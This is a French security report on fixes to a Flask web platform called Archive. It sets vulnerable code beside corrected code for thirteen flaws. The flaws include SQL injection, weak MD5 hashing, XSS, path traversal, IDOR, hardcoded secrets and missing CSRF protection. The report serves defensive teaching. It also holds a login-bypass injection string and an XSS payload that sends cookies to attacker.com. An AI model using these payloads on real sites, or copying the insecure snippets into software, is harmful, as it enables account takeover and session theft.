# Rapport de Sécurité - Corrections Appliquées

## 🛡️ Vue d'ensemble

Ce document détaille toutes les vulnérabilités corrigées dans cette version sécurisée de la plateforme Archive.

---

## 1. INJECTION SQL (CWE-89)

### Sévérité : 🔴 CRITIQUE

### Vulnérabilité
```python
# Code vulnérable
query = f"SELECT id, username FROM users WHERE username = '{username}' AND password = '{password_hash}'"
cursor.execute(query)
```

**Impact** : Un attaquant peut contourner l'authentification ou extraire des données sensibles.

**Exemple d'attaque** :
```
username: admin' OR '1'='1' --
password: anything
```

### Correction
```python
# Code sécurisé
cursor.execute(
    'SELECT id, username, password FROM users WHERE username = ?',
    (username,)
)
```

**Protection** : Utilisation de requêtes paramétrées qui échappent automatiquement les caractères spéciaux.

---

## 2. HACHAGE FAIBLE DES MOTS DE PASSE (CWE-327)

### Sévérité : 🔴 CRITIQUE

### Vulnérabilité
```python
# Utilisation de MD5
password_hash = hashlib.md5(password.encode()).hexdigest()
```

**Impact** : Les mots de passe peuvent être cassés en quelques secondes avec des rainbow tables.

**Problèmes** :
- MD5 est obsolète et cassé
- Pas de salt
- Calcul instantané (pas de protection contre brute force)

### Correction
```python
# Utilisation de bcrypt avec salt aléatoire
import bcrypt

password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

# Vérification
if bcrypt.checkpw(password.encode('utf-8'), stored_hash):
    # Authentifié
```

**Protection** :
- Algorithme moderne et sécurisé
- Salt aléatoire unique pour chaque mot de passe
- Coût de calcul ajustable (ralentit les attaques)

---

## 3. CROSS-SITE SCRIPTING (XSS) (CWE-79)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```html
<!-- Template vulnérable -->
<h4 class="note-title">{{ note[1]|safe }}</h4>
<div class="note-content">{{ note[2]|safe }}</div>
```

**Impact** : Un attaquant peut injecter du JavaScript malveillant.

**Exemple d'attaque** :
```javascript
Titre de note: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### Correction
```html
<!-- Template sécurisé -->
<h4 class="note-title">{{ note['title'] }}</h4>
<div class="note-content">{{ note['content'] }}</div>
```

**Protection** : 
- Retrait du filtre `|safe`
- Jinja2 échappe automatiquement tous les caractères HTML spéciaux
- Les données sont insérées comme texte, pas comme HTML

---

## 4. PATH TRAVERSAL (CWE-22)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```python
# Pas de validation
filename = file.filename
file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
file.save(file_path)
```

**Impact** : Un attaquant peut écrire des fichiers en dehors du répertoire prévu.

**Exemple d'attaque** :
```
Nom de fichier: ../../../etc/passwd
```

### Correction
```python
# Sanitisation stricte
from werkzeug.utils import secure_filename

def sanitize_filename(filename):
    secured = secure_filename(filename)
    if len(secured) > 100:
        name, ext = os.path.splitext(secured)
        secured = name[:95] + ext
    return secured

original_filename = sanitize_filename(file.filename)
unique_filename = str(uuid.uuid4()) + '_' + original_filename
file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
```

**Protection** :
- Utilisation de `secure_filename()` qui retire les caractères dangereux
- Ajout d'UUID unique pour éviter les conflits
- Limitation de la longueur
- Vérification du chemin avant accès

---

## 5. IDOR - INSECURE DIRECT OBJECT REFERENCES (CWE-639)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```python
# Pas de vérification de propriétaire
@app.route('/delete_file/<int:file_id>', methods=['POST'])
def delete_file(file_id):
    query = f"DELETE FROM files WHERE id = {file_id}"
    cursor.execute(query)
```

**Impact** : Un utilisateur peut supprimer les fichiers d'autres utilisateurs.

**Exemple d'attaque** :
```
POST /delete_file/123
(où 123 est l'ID d'un fichier d'un autre utilisateur)
```

### Correction
```python
def check_resource_ownership(user_id, resource_type, resource_id):
    """Vérifie que l'utilisateur est propriétaire de la ressource"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if resource_type == 'file':
        cursor.execute('SELECT user_id FROM files WHERE id = ?', (resource_id,))
    # ...
    
    result = cursor.fetchone()
    conn.close()
    return result and result['user_id'] == user_id

@app.route('/delete_file/<int:file_id>', methods=['POST'])
@login_required
def delete_file(file_id):
    user_id = session['user_id']
    
    # Vérification de propriété
    if not check_resource_ownership(user_id, 'file', file_id):
        flash('Accès non autorisé.', 'error')
        return redirect(url_for('dashboard'))
    
    # Suppression sécurisée...
```

**Protection** :
- Vérification systématique de la propriété
- Refus d'accès si l'utilisateur n'est pas propriétaire
- Logging des tentatives d'accès non autorisé

---

## 6. SECRETS EXPOSÉS (CWE-798)

### Sévérité : 🔴 CRITIQUE

### Vulnérabilité
```python
# Secrets hardcodés dans le code
app.secret_key = 'super_secret_key_123_hardcoded'
API_TOKEN = 'sk-1234567890abcdef'
DATABASE_PASSWORD = 'admin123'
```

**Impact** : Les secrets sont exposés dans le code source et Git.

### Correction
```python
# Utilisation de variables d'environnement
import os
from dotenv import load_dotenv
import secrets

load_dotenv()

app.secret_key = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
```

Fichier `.env` (non commité) :
```bash
SECRET_KEY=<généré_de_manière_sécurisée>
```

**Protection** :
- Secrets stockés hors du code
- `.env` dans `.gitignore`
- Génération automatique si variable absente
- Fichier `.env.example` pour la documentation

---

## 7. ABSENCE DE PROTECTION CSRF (CWE-352)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```html
<!-- Pas de token CSRF -->
<form method="POST" action="/create_folder">
    <input type="text" name="folder_name">
    <button type="submit">Créer</button>
</form>
```

**Impact** : Un attaquant peut forcer un utilisateur à effectuer des actions non souhaitées.

### Correction
```python
# Installation de Flask-WTF
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)
```

```html
<!-- Token CSRF dans les formulaires -->
<form method="POST" action="/create_folder">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" name="folder_name">
    <button type="submit">Créer</button>
</form>
```

**Protection** :
- Token unique par session
- Vérification automatique sur toutes les requêtes POST
- Rejet des requêtes sans token valide

---

## 8. ABSENCE DE RATE LIMITING (CWE-307)

### Sévérité : 🟡 MOYENNE

### Vulnérabilité
```python
# Pas de limitation
@app.route('/login', methods=['POST'])
def login():
    # Tentatives illimitées possibles
```

**Impact** : Attaques par force brute sur les mots de passe.

### Correction
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("10 per hour")
def login():
    # ...
```

**Protection** :
- Limitation à 10 tentatives par heure
- Protection contre le brute force
- Réponse 429 (Too Many Requests) après dépassement

### Protection Supplémentaire : Verrouillage de Compte
```python
# Après 5 tentatives échouées
if failed_attempts >= 5:
    locked_until = datetime.now() + timedelta(minutes=30)
    # Verrouiller le compte pour 30 minutes
```

---

## 9. SESSIONS NON SÉCURISÉES (CWE-614)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```python
# Configuration par défaut
app.secret_key = 'weak_key'
# Pas de configuration de cookies
```

**Impact** : Vol de session, attaques XSS sur les cookies.

### Correction
```python
app.config['SESSION_COOKIE_SECURE'] = True      # HTTPS uniquement
app.config['SESSION_COOKIE_HTTPONLY'] = True    # Pas d'accès JS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'   # Protection CSRF
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=2)
```

**Protection** :
- `Secure` : Cookie transmis uniquement via HTTPS
- `HttpOnly` : Cookie inaccessible au JavaScript (anti-XSS)
- `SameSite` : Protection contre les requêtes cross-site
- Timeout : Session expirée après 2 heures

---

## 10. DÉPENDANCES OBSOLÈTES

### Sévérité : 🔴 CRITIQUE

### Vulnérabilité
```txt
Flask==2.0.3             # CVE-2023-30861
Pillow==8.3.2            # CVE-2021-34552
requests==2.25.1         # CVE-2021-33503
```

**Impact** : Exploitation de vulnérabilités connues.

### Correction
```txt
Flask==3.0.0             # Dernière version stable
Pillow==10.2.0           # Patches de sécurité appliqués
requests==2.31.0         # Vulnérabilités corrigées
```

**Protection** :
- Mise à jour vers les dernières versions
- Vérification régulière avec `pip list --outdated`
- Surveillance des CVE

---

## 11. DEBUG MODE EN PRODUCTION (CWE-489)

### Sévérité : 🟠 ÉLEVÉE

### Vulnérabilité
```python
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

**Impact** : Exposition du code source, exécution de code via debugger.

### Correction
```python
if __name__ == '__main__':
    env = os.environ.get('FLASK_ENV', 'development')
    
    if env == 'production':
        app.run(debug=False, host='127.0.0.1', port=5000)
    else:
        app.run(debug=True, host='127.0.0.1', port=5000)
```

**Production** : Utiliser Gunicorn au lieu du serveur de développement
```bash
gunicorn -w 4 -b 0.0.0.0:5000 app:app
```

---

## 12. VALIDATION INSUFFISANTE DES ENTRÉES

### Sévérité : 🟡 MOYENNE

### Vulnérabilité
```python
# Pas de validation
folder_name = request.form['folder_name']
# Accepté directement sans vérification
```

**Impact** : Injection de données malveillantes, dépassement de buffer.

### Correction
```python
def validate_password_strength(password):
    if len(password) < 8:
        return False, "Min 8 caractères"
    if not re.search(r'[A-Z]', password):
        return False, "Au moins une majuscule"
    if not re.search(r'[a-z]', password):
        return False, "Au moins une minuscule"
    if not re.search(r'[0-9]', password):
        return False, "Au moins un chiffre"
    return True, ""

def validate_hex_color(color):
    pattern = r'^#[0-9a-fA-F]{6}$'
    return re.match(pattern, color) is not None

# Contraintes au niveau base de données
CREATE TABLE users (
    username TEXT CHECK(length(username) >= 3 AND length(username) <= 50),
    email TEXT CHECK(email LIKE '%_@_%._%'),
    ...
)
```

**Protection** :
- Validation côté serveur de tous les inputs
- Contraintes au niveau base de données
- Limites de longueur strictes
- Validation de format (email, couleur, etc.)

---

## 13. LOGGING INSUFFISANT (CWE-778)

### Sévérité : 🟡 MOYENNE

### Vulnérabilité
```python
# Pas de logging
def login():
    # Aucune trace des tentatives de connexion
```

**Impact** : Impossible de détecter ou auditer les incidents de sécurité.

### Correction
```python
import logging
from logging.handlers import RotatingFileHandler

# Configuration
file_handler = RotatingFileHandler('logs/app.log', maxBytes=10240, backupCount=10)
file_handler.setLevel(logging.INFO)
app.logger.addHandler(file_handler)

# Logging des événements
app.logger.info(f'New user registered: {username}')
app.logger.info(f'User logged in: {username}')
app.logger.warning(f'Failed login attempt for: {username}')
app.logger.error(f'Unauthorized access attempt: {user_id}')
```

**Protection** :
- Journalisation de tous les événements de sécurité
- Rotation automatique des logs
- Pas de données sensibles (mots de passe) dans les logs

---

## RÉSUMÉ DES CORRECTIONS

| # | Vulnérabilité | Sévérité | Statut |
|---|----------------|-----------|--------|
| 1 | Injection SQL | 🔴 Critique | ✅ Corrigé |
| 2 | Hachage faible | 🔴 Critique | ✅ Corrigé |
| 3 | XSS | 🟠 Élevée | ✅ Corrigé |
| 4 | Path Traversal | 🟠 Élevée | ✅ Corrigé |
| 5 | IDOR | 🟠 Élevée | ✅ Corrigé |
| 6 | Secrets exposés | 🔴 Critique | ✅ Corrigé |
| 7 | Pas de CSRF | 🟠 Élevée | ✅ Corrigé |
| 8 | Pas de Rate Limit | 🟡 Moyenne | ✅ Corrigé |
| 9 | Sessions non sécurisées | 🟠 Élevée | ✅ Corrigé |
| 10 | Dépendances obsolètes | 🔴 Critique | ✅ Corrigé |
| 11 | Debug en production | 🟠 Élevée | ✅ Corrigé |
| 12 | Validation insuffisante | 🟡 Moyenne | ✅ Corrigé |
| 13 | Logging insuffisant | 🟡 Moyenne | ✅ Corrigé |

---

**TOUTES LES VULNÉRABILITÉS ONT ÉTÉ CORRIGÉES** ✅

**Interface utilisateur** : IDENTIQUE ✅

**Fonctionnalités** : CONSERVÉES ✅
